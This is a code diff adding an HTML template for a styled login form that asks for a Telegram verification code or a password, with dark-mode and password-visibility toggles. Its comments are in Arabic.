@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>Enter Code / Password</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            /* الألوان من الكود الجديد (الوضع الفاتح) */
+            --bg-color-light: #f5f5f7;
+            --container-bg-light: rgba(255, 255, 255, 0.4);
+            --text-color-light: #222;
+            --primary-light: #3390ec;
+            --primary-hover-light: #007bb6;
+            --input-bg-light: #f7f7f7;
+            --input-border-light: #e0e0e0;
+            --shadow-light: 0 8px 32px 0 rgba(0, 0, 0, 0.15);
+            --backdrop-filter-blur: blur(15px);
+        }
+
+        body.dark {
+            /* ألوان جديدة للوضع الداكن */
+            --bg-color-dark: #121820;
+            --container-bg-dark: rgba(25, 30, 40, 0.5);
+            --text-color-dark: #ecf0f1;
+            --primary-dark: #4ECDC4;
+            --primary-hover-dark: #37b9b1;
+            --input-bg-dark: rgba(255, 255, 255, 0.05);
+            --input-border-dark: rgba(255, 255, 255, 0.1);
+            --shadow-dark: 0 8px 32px 0 rgba(0, 0, 0, 0.2);
+        }
+        
+        body {
+            font-family: 'Roboto', sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            transition: background 0.5s ease;
+            position: relative;
+            padding: 20px;
+            box-sizing: border-box;
+            
+            /* خلفية متحركة من الكود الجديد */
+            background: linear-gradient(-45deg, #17212b, #1d2733, #2b5876, #4e4376);
+            background-size: 400% 400%;
+            animation: gradient-animation 15s ease infinite;
+            overflow: hidden;
+        }
+        
+        body.dark {
+            /* تغيير خلفية الدارك مود عشان تكون مميزة */
+            background: linear-gradient(-45deg, #0f1c2b, #0c151f, #21435d, #3e385e);
+            background-size: 400% 400%;
+            animation: gradient-animation 15s ease infinite;
+        }
+
+        @keyframes gradient-animation {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .container {
+            width: 100%;
+            max-width: 380px;
+            background: var(--container-bg-light);
+            backdrop-filter: var(--backdrop-filter-blur);
+            -webkit-backdrop-filter: var(--backdrop-filter-blur);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: var(--shadow-light);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            transition: all 0.5s ease;
+            position: relative;
+            z-index: 10;
+        }
+
+        body.dark .container {
+            background: var(--container-bg-dark);
+            box-shadow: var(--shadow-dark);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        h1 {
+            text-align: center;
+            margin-bottom: 25px;
+            color: var(--primary-light);
+            font-size: 24px;
+            font-weight: 600;
+        }
+        
+        body.dark h1 {
+            color: var(--primary-dark);
+        }
+
+        label {
+            display: block;
+            margin-top: 15px;
+            font-weight: 600;
+            color: var(--text-color-light);
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+        
+        body.dark label {
+            color: var(--text-color-dark);
+        }
+
+        input {
+            width: 100%;
+            padding: 14px;
+            background: var(--input-bg-light);
+            border: 1px solid var(--input-border-light);
+            border-radius: 10px;
+            font-size: 16px;
+            outline: none;
+            transition: all 0.3s ease;
+            box-sizing: border-box;
+            color: var(--text-color-light);
+        }
+        
+        body.dark input {
+            background: var(--input-bg-dark);
+            border: 1px solid var(--input-border-dark);
+            color: var(--text-color-dark);
+        }
+
+        input:focus {
+            border-color: var(--primary-light);
+        }
+        
+        body.dark input:focus {
+            border-color: var(--primary-dark);
+        }
+
+        .password-wrapper {
+            position: relative;
+        }
+
+        .password-wrapper input {
+            padding-right: 45px;
+        }
+
+        .toggle-pass {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            font-size: 18px;
+            color: var(--text-color-light);
+            opacity: 0.6;
+            transition: all 0.3s ease;
+        }
+        
+        body.dark .toggle-pass {
+            color: var(--text-color-dark);
+        }
+
+        .toggle-pass:hover {
+            opacity: 1;
+        }
+
+        .toggle-pass.open .fa-eye-slash {
+            display: none;
+        }
+        
+        .toggle-pass:not(.open) .fa-eye {
+            display: none;
+        }
+
+        button {
+            margin-top: 30px;
+            width: 100%;
+            padding: 14px;
+            background: var(--primary-light);
+            color: white;
+            border: none;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: background 0.3s ease, transform 0.2s ease;
+        }
+        
+        body.dark button {
+            background: var(--primary-dark);
+        }
+
+        button:hover {
+            background: var(--primary-hover-light);
+            transform: translateY(-2px);
+        }
+
+        body.dark button:hover {
+            background: var(--primary-hover-dark);
+        }
+
+        #theme-toggle {
+            position: absolute;
+            top: 25px;
+            right: 25px;
+            background: var(--container-bg-light);
+            backdrop-filter: var(--backdrop-filter-blur);
+            -webkit-backdrop-filter: var(--backdrop-filter-blur);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            width: 45px;
+            height: 45px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            box-shadow: var(--shadow-light);
+            color: var(--text-color-light);
+            font-size: 18px;
+            transition: all 0.5s ease;
+            z-index: 10;
+        }
+        
+        body.dark #theme-toggle {
+            background: var(--container-bg-dark);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            box-shadow: var(--shadow-dark);
+            color: var(--text-color-dark);
+        }
+
+        #theme-toggle:hover {
+            transform: rotate(30deg) scale(1.1);
+        }
+
+        /* Media Queries for Responsiveness */
+        @media (max-width: 450px) {
+            .container {
+                margin: 0 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<button id="theme-toggle">
+    <i class="fas fa-moon"></i>
+</button>
+
+<div class="container">
+    {% if password_required %}
+    <h1>Enter Password</h1>
+    <form method="post">
+        <label for="password-field">Password:</label>
+        <div class="password-wrapper">
+            <input type="password" name="password" id="password-field" required>
+            <span class="toggle-pass" onclick="togglePassword()">
+                <i class="fas fa-eye-slash"></i>
+                <i class="fas fa-eye"></i>
+            </span>
+        </div>
+        <button type="submit">Submit</button>
+    </form>
+    {% else %}
+    <h1>Enter Telegram Code</h1>
+    <form method="post">
+        <label for="code-field">Code sent to your Telegram:</label>
+        <input type="text" name="code" id="code-field" required>
+        <button type="submit">Submit</button>
+    </form>
+    {% endif %}
+</div>
+
+<script>
+    const passwordField = document.getElementById('password-field');
+    const togglePass = document.querySelector('.toggle-pass');
+
+    // Dark Mode Toggle
+    const toggleBtn = document.getElementById("theme-toggle");
+    toggleBtn.addEventListener("click", () => {
+        document.body.classList.toggle("dark");
+        const icon = toggleBtn.querySelector('i');
+        if (document.body.classList.contains("dark")) {
+            icon.classList.remove("fa-moon");
+            icon.classList.add("fa-sun");
+        } else {
+            icon.classList.remove("fa-sun");
+            icon.classList.add("fa-moon");
+        }
+    });
+
+    // Show/Hide Password
+    function togglePassword() {
+        if (passwordField && passwordField.type === "password") {
+            passwordField.type = "text";
+            togglePass.classList.add('open');
+        } else if (passwordField) {
+            passwordField.type = "password";
+            togglePass.classList.remove('open');
+        }
+    }
+</script>
+
+</body>
+</html>
